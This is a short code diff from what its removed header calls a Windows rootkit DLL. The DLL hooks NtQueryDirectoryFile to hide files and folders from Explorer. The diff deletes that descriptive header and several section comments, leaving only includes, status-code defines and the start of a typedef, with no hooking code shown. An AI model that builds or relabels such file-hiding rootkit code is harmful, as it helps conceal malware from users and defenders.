@@ -1,11 +1,3 @@
-/*
- * BASMOS Rootkit - File Hooks DLL
- * Copyright (c) 2025 - 28zaakypro@proton.me
- * 
- * NtQueryDirectoryFile hooking to hide files and directories from Explorer.
- * Uses inline hooking with trampoline to filter FILE_DIRECTORY_INFORMATION lists.
- */
-
 #include <windows.h>
 #include <winternl.h>
 #include <string>
@@ -17,14 +9,8 @@
 
 using namespace std;
 
-// Status codes
-
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 #define STATUS_NO_MORE_FILES ((NTSTATUS)0x80000006L)
-
-// ============================================================================
-// TYPEDEFS
-// ============================================================================
 
 typedef NTSTATUS (NTAPI* NtQueryDirectoryFile_t)(
     HANDLE FileHandle,
